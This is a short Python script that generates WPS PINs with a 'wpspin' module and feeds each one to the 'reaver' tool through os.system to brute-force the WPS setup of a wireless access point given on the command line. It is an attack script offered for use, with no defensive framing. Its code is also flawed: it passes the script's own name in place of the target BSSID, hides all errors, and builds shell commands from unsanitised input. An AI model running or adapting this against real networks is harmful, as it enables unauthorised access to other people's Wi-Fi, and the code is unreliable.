import wpspin
import sys
import os
generator = wpspin.WPSpin()
result=generator.getList(sys.argv[0])
for xpin in result:
    try:
        if isinstance(int(xpin[0]), int):
            os.system(f"reaver -i {sys.argv[2]} -b {sys.argv[1]} --timeout {sys.argv[3]} -p {xpin} -vv")
    except Exception as e:
        pass
